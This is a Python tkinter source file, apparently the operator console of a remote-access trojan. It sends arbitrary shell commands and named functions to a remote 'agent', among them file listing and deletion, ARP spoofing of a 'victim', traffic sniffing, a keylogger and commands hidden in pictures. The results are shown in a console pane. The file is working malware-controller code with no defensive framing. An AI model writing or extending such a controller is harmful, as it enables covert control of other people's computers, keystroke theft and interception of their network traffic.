import threading
import tkinter
from tkinter import ttk
from tkinter import StringVar
from Server import Server
import tkinter.scrolledtext as tkst
import sys
import time

cond = True


class Adder(ttk.Frame):
    """The adders gui and functions."""

    def __init__(self, parent, *args, **kwargs):
        ttk.Frame.__init__(self, parent, *args, **kwargs)
        self.root = parent
        self.init_gui()
        self.server = Server()
        self.e = ttk.Entry(self, width=100)
        self.l = ttk.Label(self, text='')
        threading.Thread(target=self.server.run).start()
        threading.Thread(target=self.check_result).start()

    def changed(self, *args):
        val = self.var.get()

        if val == 'Run Netstat':
            self.e.grid_forget()
            self.l.grid_forget()
        elif val == 'Get All Files':
            self.l.config(text='Insert dir (optional).')
            self.l.grid(column=0, row=6, columnspan=6, pady=5)
            self.e.grid(column=1, row=7, pady=5)
        elif val == 'Open Socket':
            self.l.config(text='Insert ip and port (use by white space for split them).')
            self.l.grid(column=0, row=6, columnspan=6, pady=5)
            self.e.grid(column=1, row=7, pady=5)
        elif val == 'Change File':
            self.l.config(text='Insert path of file and action [+h/-h/rm/mv] (use by white space for split them).')
            self.l.grid(column=0, row=6, columnspan=6, pady=5)
            self.e.grid(column=1, row=7, pady=5)
        elif val == 'Get Arp Table':
            self.e.grid_forget()
            self.l.grid_forget()
        elif val == 'Spoof Victim':
            self.l.config(text='Insert ip of victim.')
            self.l.grid(column=0, row=6, columnspan=6, pady=5)
            self.e.grid(column=1, row=7, pady=5)
        elif val == 'Stop Spoofing Victim':
            self.l.config(text='Insert ip of victim.')
            self.l.grid(column=0, row=6, columnspan=6, pady=5)
            self.e.grid(column=1, row=7, pady=5)
        elif val == 'Sniff Current Traffic':
            self.l.config(text='Insert filter (optional - use only 802.11 filters!!!).')
            self.l.grid(column=0, row=6, columnspan=6, pady=5)
            self.e.grid(column=1, row=7, pady=5)
        elif val == 'Stop Sniff Traffic':
            self.e.grid_forget()
            self.l.grid_forget()
        elif val == 'Start Key Logger':
            self.e.delete(0, 'end')
            self.e.insert(0, self.server.shared_key)
            self.e.grid_forget()
            self.l.grid_forget()
        elif val == 'Stop Key Logger':
            self.e.grid_forget()
            self.l.grid_forget()
        elif val == 'Hide Message In Picture':
            self.l.config(text='Insert url of img and command to run (use by white space for split them).')
            self.l.grid(column=0, row=6, columnspan=6, pady=5)
            self.e.grid(column=1, row=7, pady=5)
        elif val == 'Kill All Threads':
            self.e.grid_forget()
            self.l.grid_forget()

        ttk.Button(self, text='Exec', command=self.exec_func).grid(column=0, row=8, columnspan=4, pady=5)

    def check_result(self):
        global cond
        while cond:
            if self.server.result != '':
                self.answer_frame.configure(state='normal')
                self.answer_frame.insert(tkinter.INSERT, self.server.result + '\n')
                self.answer_frame.configure(state='disabled')
                self.server.todo = ''
                self.server.result = ''
                self.exex_entry.delete(0, 'end')
                self.e.delete(0, 'end')
            time.sleep(0.5)

    def on_quit(self):
        global cond
        """Exits program."""
        self.destroy()
        self.quit()
        cond = False
        self.server.cond = False
        self.server.server_socket.close()
        for conn in self.server.connections:
            conn.close()
        sys.exit()

    def exec(self):
        self.server.set_todo('cmd ' + self.exex_entry.get())
        self.answer_frame.configure(state='normal')
        self.answer_frame.insert(tkinter.INSERT, "Please wait until get response from the agent...\n")
        self.answer_frame.configure(state='disabled')

    def exec_func(self):
        self.server.set_todo('func Components.dll ' + self.var.get().replace(" ", "") + " " + self.e.get())
        self.answer_frame.configure(state='normal')
        self.answer_frame.insert(tkinter.INSERT, "Please wait until get response from the agent...")
        self.answer_frame.configure(state='disabled')

    def init_gui(self):
        """Builds GUI."""
        self.root.geometry("800x800")
        self.root.protocol('WM_DELETE_WINDOW', self.on_quit)
        self.root.title('Server UI')
        self.var = StringVar(self.root)

        # menubar = tkinter.Menu(self.root)
        # menubar.add_command(label='Exit', command=self.on_quit)
        # self.root.config(menu=menubar)

        self.grid(column=0, row=0, sticky='n')
        self.root.grid_rowconfigure(0, weight=1)
        self.root.grid_columnconfigure(0, weight=1)

        ttk.Label(self, text='Access Control', font = "Helvetica 16").grid(column=0, row=1, columnspan=4)
        ttk.Label(self, text='You can insert here any command action.').grid(
            column=0, row=2, columnspan=4, pady=(50, 0))
        self.exex_entry = ttk.Entry(self, width=100)
        self.exex_entry.grid(column=1, row=3, pady=5)
        exec_button = ttk.Button(self, text='Exec', command=self.exec).grid(column=0, row=4, columnspan=4, pady=5)

        functions = [
            "Or you can choose function to run",
            "Run Netstat",
            "Get All Files",
            "Open Socket",
            "Change File",
            "Get Arp Table",
            "Spoof Victim",
            "Stop Spoofing Victim",
            "Sniff Current Traffic",
            "Start Key Logger",
            "Stop Key Logger",
            "Hide Message In Picture",
            "Kill All Threads"
        ]
        ttk.OptionMenu(self, self.var, *functions).grid(
            column=0, row=5, columnspan=4, pady=5)
        self.var.trace('w', self.changed)

        # self.answer_frame = ttk.LabelFrame(self, text='Answer', height=500, width=300)
        self.answer_frame = tkst.ScrolledText(
            master=self,
            wrap=tkinter.WORD,
            state='disabled',
            background='black',
            foreground='white',
            width=70,
            height=20
        )
        self.answer_frame.grid(column=0, row=9, columnspan=4, pady=5)
        # answer_label = ttk.Label(self.answer_frame, text='')
        # answer_label.grid(column=0, row=6, columnspan=4)


def create_window():
    root = tkinter.Tk()
    Adder(root)
    root.mainloop()
    print('hi')


def main():
    threading.Thread(target=create_window).start()


if __name__ == "__main__":
    main()
